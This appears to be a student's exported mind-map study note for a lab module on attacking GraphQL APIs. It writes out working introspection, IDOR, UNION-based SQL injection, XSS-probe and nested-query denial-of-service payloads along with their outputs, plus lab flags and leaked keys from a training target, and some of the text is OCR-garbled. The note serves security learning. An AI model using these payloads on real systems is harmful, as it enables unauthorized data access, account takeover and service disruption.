---
tags: [CWES, XMind, output, xmind-output]
source_file: CWES.xmind
source_sheet: "2"
module: "Attacking GraphQL"
output_topics: 42
---

# Attacking GraphQL — XMind Outputs

> [!info] Yellow XMind topic semantics
> The author uses yellow topics to represent **outputs**. Every entry below corresponds to one yellow source topic and retains its XMind topic ID in a hidden validation marker.

## Outputs

> [!output]+ 🟨 Output 001
> {
>   "data": {
>     "posts": [
>       {
>         "title": "Hello World!",
>         "author": {
>           "username": "htb-stdnt",
>           "role": "user"
>         }
>       },
>       {
>         "title": "Test",
>         "author": {
>           "username": "test",
>           "role": "user"
>         }
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Introduction to GraphQL → Basic Overview → add or remove fields → {   users(username: "admin") {     id     username     password   } } → assume that a posts query returns a field author → We can then query the username and role of the author in our query → {    posts {      title      author {        username        role      }    }  } → result contains the title of all posts as well as the queried data → {    "data": {      "posts": [        {          "title": "Hello World!",          "author": {            "username": "htb-stdnt",            "role": "user"          }        },        {          "title": "Test",          "author": {            "username": "test",            "role": "user"          }        }      ]    }  }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: ca03d6b8-df34-4e5d-a186-2994962f7a1e -->

> [!output]+ 🟨 Output 002
> "data": {
> "posts": [
> "uuid": "1",
> "title": "Lorem ipsum 1",
> "body":
> "Lorem ipsum dolor sit amet, consetetur sadipscing eliti
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → observe multiple requests to the /graphql endpoints that contain GraphQL queries → { "query": "{posts { uid title body category author (username }}}" } → "data": { "posts": [ "uuid": "1", "title": "Lorem ipsum 1", "body": "Lorem ipsum dolor sit amet, consetetur sadipscing eliti
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5860443b-437d-4904-8a6d-608dfaa96317 -->

> [!output]+ 🟨 Output 003
> [*] Discovered GraphQL Engine: (Graphene)
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → identify the GraphQL engine → using the tool graphw00f → https://github.com/dolevf/graphw00f → un the tool using the main.py Python script → run the tool in fingerprint (-f) and detect mode (-d) → python3 main.py -d -f -t http://172.17.0.2 → [*] Discovered GraphQL Engine: (Graphene)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 86fd75ca-a349-46ba-91c9-40d95b7335c6 -->

> [!output]+ 🟨 Output 004
> [!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → identify the GraphQL engine → using the tool graphw00f → https://github.com/dolevf/graphw00f → un the tool using the main.py Python script → run the tool in fingerprint (-f) and detect mode (-d) → python3 main.py -d -f -t http://172.17.0.2 → [!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/graphene.md
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 86975bce-a333-4b7c-99ad-ce21bdd81d7f -->

> [!output]+ 🟨 Output 005
> Int
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → Introspection → GraphQL feature that enables users to query the GraphQL API about the structure of the backend system → query the __schema field → we can identify all GraphQL types supported by the backend using the following query → {   __schema {     types {       name     }   } } → Int
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 41ab2fae-4d83-4437-929e-a750c85583db -->

> [!output]+ 🟨 Output 006
> Boolean
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → Introspection → GraphQL feature that enables users to query the GraphQL API about the structure of the backend system → query the __schema field → we can identify all GraphQL types supported by the backend using the following query → {   __schema {     types {       name     }   } } → Boolean
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 5320a7bd-e0ca-41d6-b5ee-bf62356133db -->

> [!output]+ 🟨 Output 007
> UserObject
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → Introspection → GraphQL feature that enables users to query the GraphQL API about the structure of the backend system → query the __schema field → we can identify all GraphQL types supported by the backend using the following query → {   __schema {     types {       name     }   } } → UserObject
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 624167ba-984e-45dd-9552-52bf35954652 -->

> [!output]+ 🟨 Output 008
> "name": "UserObject"
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → LAB → After executing an introspection query, what is the flag you can exfiltrate? → get the names of objects → {   __schema {     types {       name     }   } } → "name": "UserObject"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 94976d1e-cf5c-448b-8f46-2e8acf66798b -->

> [!output]+ 🟨 Output 009
> "name": "SecretObject"
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → LAB → After executing an introspection query, what is the flag you can exfiltrate? → get the names of objects → {   __schema {     types {       name     }   } } → "name": "SecretObject"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 28626917-736a-4ea3-934b-a8fc8ace44e8 -->

> [!output]+ 🟨 Output 010
> "name": "secret"
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → LAB → After executing an introspection query, what is the flag you can exfiltrate? → get all the valuse in SecretObjective → {   __type(name: "SecretObject") {     name     fields {       name       type {         name         kind       }     }   } } → "name": "secret"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 33e6d196-aeb4-474a-868f-0a3a8e14b898 -->

> [!output]+ 🟨 Output 011
> {
>   "data": {
>     "secrets": [
>       {
>         "id": "U2VjcmV0T2JqZWN0OjE=",
>         "secret": "HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}"
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Information Disclosure → Identifying the GraphQL Engine → LAB → After executing an introspection query, what is the flag you can exfiltrate? → get the secret value → {   secrets {     id     secret   } } → {   "data": {     "secrets": [       {         "id": "U2VjcmV0T2JqZWN0OjE=",         "secret": "HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}"       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2ff47b48-1fe2-48c5-a468-d8658746d4d7 -->

> [!output]+ 🟨 Output 012
> {
> "data": {
> "user" : (
> "id": "VXN1ck9iamVjdDox",
> "username": "htb-stdnt",
> "msg": "Welcome!",
> "role": "user"
> }
>
> **Source path:** Attacking GraphQL → Insecure Direct Object Reference (IDOR) → Identifying IDOR → access our user profile: → {"query" : "{user(username: \"htb-stdnt\") ( id username msg role }}" } → { "data": { "user" : ( "id": "VXN1ck9iamVjdDox", "username": "htb-stdnt", "msg": "Welcome!", "role": "user" }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 3155b1e5-b22e-46a6-93d2-d869e8ca8ef2 -->

> [!output]+ 🟨 Output 013
> "data": {
> "user": {
> "id": "VXNIck9iamVjdDoy",
> username": "test",
> "msg": "Test"
> "role": "user"
>
> **Source path:** Attacking GraphQL → Insecure Direct Object Reference (IDOR) → Identifying IDOR → let us provide a different username we know exists: test → {"query" : "{user(username: \"test\") ( id username msg role }}" } → "data": { "user": { "id": "VXNIck9iamVjdDoy", username": "test", "msg": "Test" "role": "user"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 943df88e-5c52-4ad8-bc7c-8c274b2c50f2 -->

> [!output]+ 🟨 Output 014
> "name": "username",
> "type": {
> "name": "String",
> "kind": "SCALAR"
> "name": "password",
> "type": (
> "name": "String",
> "kind": "SCALAR"
>
> **Source path:** Attacking GraphQL → Insecure Direct Object Reference (IDOR) → Exploiting IDOR → identify the data that can be accessed without authorization. → introspection queries to determine all fields of the User type → {    __type(name: "UserObject") {      name      fields {        name        type {          name          kind        }      }    }  } → "name": "username", "type": { "name": "String", "kind": "SCALAR" "name": "password", "type": ( "name": "String", "kind": "SCALAR"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e18ca141-1277-44ef-8986-de6ab15e6bc5 -->

> [!output]+ 🟨 Output 015
> "data": {
> "user" : ‹
> "username": "test",
> "password": "b4574701cdf945940353b356925dddb7"
>
> **Source path:** Attacking GraphQL → Insecure Direct Object Reference (IDOR) → Exploiting IDOR → obtain another user's password by adding the password field → {   user(username: "test") {     username     password   } } → "data": { "user" : ‹ "username": "test", "password": "b4574701cdf945940353b356925dddb7"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 6845e2ce-2dea-4899-b4c0-3ca7fd6bb1c5 -->

> [!output]+ 🟨 Output 016
> {
>   "data": {
>     "user": {
>       "username": "admin",
>       "password": "HTB{79ebbbce53f40edf75c667ef6fd36fae}"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Insecure Direct Object Reference (IDOR) → LAB → After following the steps in the section, what is the flag you can find in the admins password? → {   user(username: "ADMIN") {     username     password   } } → {   "data": {     "user": {       "username": "admin",       "password": "HTB{79ebbbce53f40edf75c667ef6fd36fae}"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 4dc1873e-0da5-46ea-8205-4ead2af0bff5 -->

> [!output]+ 🟨 Output 017
> {
> "errors": [
> "message":
> "Field \"postByAuthor\" argument l"authorl" of type \"String!!" is required but not provided."•
> "locations": [
> {
> "line": 1,
> "column": 2
> }
> ]
> }
> }
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → identify if a query requires an argument → {   postByAuthor {     id     title   } } → { "errors": [ "message": "Field \"postByAuthor\" argument l"authorl" of type \"String!!" is required but not provided."• "locations": [ { "line": 1, "column": 2 } ] } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7eea8121-ba38-4d58-996a-0aa7d08de953 -->

> [!output]+ 🟨 Output 018
> {
>   "data": {
>     "postByAuthor": [
>       {
>         "id": "UG9zdE9iamVjdDox",
>         "title": "Lorem ipsum 1"
>       },
>       {
>         "id": "UG9zdE9iamVjdDoy",
>         "title": "Lorem ipsum 2"
>       },
>       {
>         "id": "UG9zdE9iamVjdDoz",
>         "title": "Lorem ipsum 3"
>       },
>       {
>         "id": "UG9zdE9iamVjdDo0",
>         "title": "Lorem ipsum 4"
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → identify if a query requires an argument → {   postByAuthor {     id     title   } } → { "errors": [ "message": "Field \"postByAuthor\" argument l"authorl" of type \"String!!" is required but not provided."• "locations": [ { "line": 1, "column": 2 } ] } } → supplying the author argument → {   postByAuthor(author: "admin") {     id     title   } } → in Burp → "query": "{postByAuthor(author: \"admin\") { id title }}" → {   "data": {     "postByAuthor": [       {         "id": "UG9zdE9iamVjdDox",         "title": "Lorem ipsum 1"       },       {         "id": "UG9zdE9iamVjdDoy",         "title": "Lorem ipsum 2"       },       {         "id": "UG9zdE9iamVjdDoz",         "title": "Lorem ipsum 3"       },       {         "id": "UG9zdE9iamVjdDo0",         "title": "Lorem ipsum 4"       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b9f77cf0-39d1-4a31-9203-417495a4bc70 -->

> [!output]+ 🟨 Output 019
> "data": {
> "postByAuthor": null
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → investigate whether the author argument is vulnerable to SQL injection → try a basic SQL injection payload → "query": "(postyAuthor (author: \admin" -. -1") (id title H" → "data": { "postByAuthor": null
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: a2cabc45-472b-4aeb-bfc9-58cdebca04a3 -->

> [!output]+ 🟨 Output 020
> "data": {
> "user": (
> "uuid": "1",
> "username": "htb-stdnt",
> "role": "user"
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → move on to the user query → {   user(username: "htb-sdtnt' -- -") {     uuid     username     role   } } → "data": { "user": ( "uuid": "1", "username": "htb-stdnt", "role": "user"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 8978ab48-ae17-4e38-b00b-0baab561ff9f -->

> [!output]+ 🟨 Output 021
> "errors": [
> "message":
> "(pymysql. err. ProgrammingError) (1064, 1"You have an error in your SQL syntax
> ...
> TruY rI
> VAIAVA
> er_role, user.msg AS user_msg InFROM user \WHERE username=
> 'htb-stdnt' In LIMIT %(param_1)s] \n[parameters: ('param_1'
> : 1)] \n(Background on this error at: https://sqlalche.me/e/
> 20/6405)"
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → move on to the user query → {   user(username: "htb-sdtnt' -- -") {     uuid     username     role   } } → "data": { "user": ( "uuid": "1", "username": "htb-stdnt", "role": "user" → inject a single quote without comment → "query": "(user (username: \"htb-stdnt'\") { uuid username role }}" → "errors": [ "message": "(pymysql. err. ProgrammingError) (1064, 1"You have an error in your SQL syntax ... TruY rI VAIAVA er_role, user.msg AS user_msg InFROM user \WHERE username= 'htb-stdnt' In LIMIT %(param_1)s] \n[parameters: ('param_1' : 1)] \n(Background on this error at: https://sqlalche.me/e/ 20/6405)"
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 1151a17f-4ea3-41ec-bdcb-4b2e7529d242 -->

> [!output]+ 🟨 Output 022
> {
>   "data": {
>     "user": {
>       "username": "user,secret,post"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Injection Attacks → SQL Injection → construct a UNION-based SQL injection payload → GraphQL query only returns the first row → we will use the GROUP_CONCAT function to exfiltrate multiple rows at a time → {   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {     username   } } → {   "data": {     "user": {       "username": "user,secret,post"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: b247d67d-07d6-4e2c-8c8a-c449adf9ab50 -->

> [!output]+ 🟨 Output 023
> "data" : {
> "user": null
>
> **Source path:** Attacking GraphQL → Injection Attacks → Cross-Site Scripting (XSS) → "query" : role }}" "{user (username: \"«script›alert (1)&lt;/script&gt;|") ‹ uuid username → "data" : { "user": null
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 67405e1a-ef81-4aa7-a688-7041f926d447 -->

> [!output]+ 🟨 Output 024
> {
> "errors": [
> "message":
> "Argument |"id\" has invalid value |"&lt;script&gt;alert(1)&lt;/script&gt;/". InExpected type |"Int|", found |"&lt;script›alert(1)&lt;/
> riptン".
> "locations": [
> "line": 1,
> "column": 11
>
> **Source path:** Attacking GraphQL → Injection Attacks → Cross-Site Scripting (XSS) → examine the post query, → requires an integer ID as an argument. If we instead submit a string argument containing an XSS payload → "query" : "{post (id: \"&lt;script›alert(1)&lt;/script&gt;\") { id title body categ ory author ( username }}}" → { "errors": [ "message": "Argument |"id\" has invalid value |"&lt;script&gt;alert(1)&lt;/script&gt;/". InExpected type |"Int|", found |"&lt;script›alert(1)&lt;/ riptン". "locations": [ "line": 1, "column": 11
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 16b9e10b-5dae-457c-898a-64954d685cb5 -->

> [!output]+ 🟨 Output 025
> {
>   "errors": [
>     {
>       "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax;...
>
> **Source path:** Attacking GraphQL → Injection Attacks → LAB → Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find? → {   user(username: "htb-sdtnt'") {     uuid     username     role   } } → {   "errors": [     {       "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax;...
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 22c45d51-98de-4951-8e1c-41b1db48c960 -->

> [!output]+ 🟨 Output 026
> {
>   "data": {
>     "user": {
>       "username": "user,secret,flag,post"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Injection Attacks → LAB → Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find? → {   user(username: "htb-sdtnt'") {     uuid     username     role   } } → {   "errors": [     {       "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax;... → {   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {     username   } } → {   "data": {     "user": {       "username": "user,secret,flag,post"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 302dffcc-cfc4-4e60-97f1-8da99bb3fd3f -->

> [!output]+ 🟨 Output 027
> {
>   "data": {
>     "user": {
>       "username": "HTB{1105f1d9480ac244a0c8f2bc47594581}"
>     }
>   }
> }
>
> **Source path:** Attacking GraphQL → Injection Attacks → LAB → Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find? → {   user(username: "htb-sdtnt'") {     uuid     username     role   } } → {   "errors": [     {       "message": "(pymysql.err.ProgrammingError) (1064, \"You have an error in your SQL syntax;... → {   user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {     username   } } → {   "data": {     "user": {       "username": "user,secret,flag,post"     }   } } → {   user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {     username   } } → {   "data": {     "user": {       "username": "HTB{1105f1d9480ac244a0c8f2bc47594581}"     }   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 365304ce-6439-4a83-a3b7-625c7c3378f5 -->

> [!output]+ 🟨 Output 028
> Something went wrong
>
> **Source path:** Attacking GraphQL → Denial-of-Service (DoS) &amp; Batching Attacks → Denial-of-Service (DoS) Attacks → abuse this loop by constructing a query that queries the author of all posts → posts object is a connection, we need to specify the edges and node fields to obtain a reference to the corresponding Post object → {    posts {      author {        posts {          edges {            node {              author {                username              }            }          }        }      }    }  } → look at the result of this query, it is already quite large because the response grows exponentially larger with each iteration of the loop we query → Making our initial query large → {   posts {     author {       posts {         edges {           node {             author {               posts {                 edges {                   node {                     author {                       posts {                         edges {                           node {                             author {                               posts {                                 edges {                                   node {                                     author {                                       posts {                                         edges {                                           node {                                             author {                                               posts {                                                 edges {                                                   node {                                                     author {                                                       posts {                                                         edges {                                                           node {                                                             author {                                                               posts {                                                                 edges {                                                                   node {                                                                     author {                                                                       username                                                                     }                                                                   }                                                                 }                                                               }                                                             }                                                           }                                                         }                                                       }                                                     }                                                   }                                                 }                                               }                                             }                                           }                                         }                                       }                                     }                                   }                                 }                               }                             }                           }                         }                       }                     }                   }                 }               }             }           }         }       }     }   } } → Something went wrong
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f7a3519b-d4b1-4f11-b01c-98a46c7ebea9 -->

> [!output]+ 🟨 Output 029
> "data": {
> "type": {
> "name":
> "RegisterUserInput",
> "inputFields": [
> {
> "name":
> "username"
> "description": null,
> "defaultValue": null
> "name":
> "password"
> "description": null,
> "defaultValue": null
> "name": "role"
> "description": null,
> "defaultValue": null
> "name":
> "msg"
> "description":
> null,
> "defaultValue": null
>
> **Source path:** Attacking GraphQL → Mutations → identifying all mutations supported by the backend and their arguments. → now query all fields of the RegisterUserInput object → {       __type(name: "RegisterUserInput") {      name      inputFields {        name        description        defaultValue      }    }  } → "data": { "type": { "name": "RegisterUserInput", "inputFields": [ { "name": "username" "description": null, "defaultValue": null "name": "password" "description": null, "defaultValue": null "name": "role" "description": null, "defaultValue": null "name": "msg" "description": null, "defaultValue": null
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: f1f3929e-6f7e-4e51-a45c-bcf237d5f0e1 -->

> [!output]+ 🟨 Output 030
> HTB{f7082828b5e5ad40d955846ba415d17f}
>
> **Source path:** Attacking GraphQL → Mutations → LAB → What is the flag you find in the admin dashboard? → HTB{f7082828b5e5ad40d955846ba415d17f}
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 58007dfc-60e8-482a-8b38-57bfc5195854 -->

> [!output]+ 🟨 Output 031
> [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
> [HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)
> [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
> [HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)
> [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
> [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
> [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
> [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
> [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
>
> **Source path:** Attacking GraphQL → Tools of the Trade → security audit → https://github.com/dolevf/graphql-cop → python3 graphql-cop.py  -v → python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql → [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)  [HIGH] Array-based Query Batching - Batch queries allowed with 10+ simultaneous queries (Denial of Service - /graphql)  [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)  [HIGH] Field Duplication - Queries are allowed with 500 of the same repeated field (Denial of Service - /graphql)  [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)  [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)  [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)  [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)  [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: d955b516-264a-4f2d-a807-2428bf52008a -->

> [!output]+ 🟨 Output 032
> [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql)
> [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql)
> [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql)
> [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql)
> [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql)
> [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql)
> [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → python graphql-cop.py -t http://154.57.164.67:31972/graphql → [HIGH] Alias Overloading - Alias Overloading with 100+ aliases is allowed (Denial of Service - /graphql) [HIGH] Directive Overloading - Multiple duplicated directives allowed in a query (Denial of Service - /graphql) [LOW] Field Suggestions - Field Suggestions are Enabled (Information Leakage - /graphql) [MEDIUM] GET Method Query Support - GraphQL queries allowed using the GET method (Possible Cross Site Request Forgery (CSRF) - /graphql) [LOW] GraphQL IDE - GraphiQL Explorer/Playground Enabled (Information Leakage - /graphql) [HIGH] Introspection - Introspection Query Enabled (Information Leakage - /graphql) [MEDIUM] POST based url-encoded query (possible CSRF) - GraphQL accepts non-JSON queries over POST (Possible Cross Site Request Forgery - /graphql)
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 7b39d802-84d8-4603-a4ca-95b7d566a643 -->

> [!output]+ 🟨 Output 033
> {
>   "data": {
>     "activeApiKeys": [
>       {
>         "id": "QXBpS2V5T2JqZWN0OjE=",
>         "role": "guest",
>         "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"
>       },
>       {
>         "id": "QXBpS2V5T2JqZWN0OjI=",
>         "role": "guest",
>         "key": "9cf8622bbc9fdc78f245663e08e5b4c1"
>       },
>       {
>         "id": "QXBpS2V5T2JqZWN0OjM=",
>         "role": "admin",
>         "key": "0711a879ed751e63330a78a4b195bbad"
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → introspection → after Gemini review → Extract Internal System API Keys → query LeakApiKeys {   activeApiKeys {     id     role     key   } } → {   "data": {     "activeApiKeys": [       {         "id": "QXBpS2V5T2JqZWN0OjE=",         "role": "guest",         "key": "fbb64ce26fbe8a8d8d6895b8e6ba21a3"       },       {         "id": "QXBpS2V5T2JqZWN0OjI=",         "role": "guest",         "key": "9cf8622bbc9fdc78f245663e08e5b4c1"       },       {         "id": "QXBpS2V5T2JqZWN0OjM=",         "role": "admin",         "key": "0711a879ed751e63330a78a4b195bbad"       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 2fe5edcd-e6b0-4853-85d3-7e8bcc0f980e -->

> [!output]+ 🟨 Output 034
> {
>   "data": {
>     "allEmployees": [
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6MQ==",
>         "username": "vautia",
>         "employeeId": 1337,
>         "role": "employee"
>       },
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6Mg==",
>         "username": "pedant",
>         "employeeId": 1338,
>         "role": "employee"
>       },
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6Mw==",
>         "username": "21y4d",
>         "employeeId": 1339,
>         "role": "manager"
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → introspection → after Gemini review → Extract Employee Roles and IDs → query LeakEmployees {   allEmployees {     id     username     employeeId     role   } } → {   "data": {     "allEmployees": [       {         "id": "RW1wbG95ZWVPYmplY3Q6MQ==",         "username": "vautia",         "employeeId": 1337,         "role": "employee"       },       {         "id": "RW1wbG95ZWVPYmplY3Q6Mg==",         "username": "pedant",         "employeeId": 1338,         "role": "employee"       },       {         "id": "RW1wbG95ZWVPYmplY3Q6Mw==",         "username": "21y4d",         "employeeId": 1339,         "role": "manager"       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 0241bd05-d6a9-4819-946b-bb8b95beb5ee -->

> [!output]+ 🟨 Output 035
> {
>   "data": {
>     "allEmployees": [
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6MQ==",
>         "username": "vautia",
>         "employeeId": 1337,
>         "role": "employee"
>       },
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6Mg==",
>         "username": "pedant",
>         "employeeId": 1338,
>         "role": "employee"
>       },
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6Mw==",
>         "username": "21y4d",
>         "employeeId": 1339,
>         "role": "manager"
>       },
>       {
>         "id": "RW1wbG95ZWVPYmplY3Q6NA==",
>         "username": "pwned_admin",
>         "employeeId": 9999,
>         "role": "manager"
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → introspection → after Gemini review → Extract Employee Roles and IDs → query ConfirmDirectory {   allEmployees {     id     username     employeeId     role   } } → {   "data": {     "allEmployees": [       {         "id": "RW1wbG95ZWVPYmplY3Q6MQ==",         "username": "vautia",         "employeeId": 1337,         "role": "employee"       },       {         "id": "RW1wbG95ZWVPYmplY3Q6Mg==",         "username": "pedant",         "employeeId": 1338,         "role": "employee"       },       {         "id": "RW1wbG95ZWVPYmplY3Q6Mw==",         "username": "21y4d",         "employeeId": 1339,         "role": "manager"       },       {         "id": "RW1wbG95ZWVPYmplY3Q6NA==",         "username": "pwned_admin",         "employeeId": 9999,         "role": "manager"       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: e2128649-6421-438b-8d99-192e5ad03033 -->

> [!output]+ 🟨 Output 036
> {
>   "data": {
>     "allCustomers": [
>       {
>         "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",
>         "firstName": "Antony",
>         "lastName": "Blair",
>         "address": "13 Hide A Way Road. Winter Park, FL 32789"
>       },
>       {
>         "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",
>         "firstName": "Margaret",
>         "lastName": "Liverman",
>         "address": "4797 New Street. Coos Bay, OR 97420 "
>       },
>       {
>         "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",
>         "firstName": "Billy",
>         "lastName": "Sawyer",
>         "address": "587 Hickory Lane. Washington, DC 20017 "
>       }
>     ]
>   }
> }
>
> **Source path:** Attacking GraphQL → Skills Assessment → Exploit the vulnerable GraphQL API to obtain the flag. → introspection → after Gemini review → Exfiltrate the Customer Database → query GetCustomerData {   allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {     id     firstName     lastName     address   } } → {   "data": {     "allCustomers": [       {         "id": "Q3VzdG9tZXJPYmplY3Q6MQ==",         "firstName": "Antony",         "lastName": "Blair",         "address": "13 Hide A Way Road. Winter Park, FL 32789"       },       {         "id": "Q3VzdG9tZXJPYmplY3Q6Mg==",         "firstName": "Margaret",         "lastName": "Liverman",         "address": "4797 New Street. Coos Bay, OR 97420 "       },       {         "id": "Q3VzdG9tZXJPYmplY3Q6Mw==",         "firstName": "Billy",         "lastName": "Sawyer",         "address": "587 Hickory Lane. Washington, DC 20017 "       }     ]   } }
> **XMind color:** `#F3D321FF`
<!-- xmind-output-id: 89635642-fac9-4af6-946a-ea16e09e5c0f -->

> [!output]+ 🟨 Output 037
> {
>   "data": {
>     "addEmployee": {
>       "employee": {
>         "id": "RW1wbG95ZWVPYmplY3Q6NA==",
>         "username": "pwned_admin",
>         "employeeId": 9999,
>         "role": "manager"
>       }
>     }
>   }
> }
>
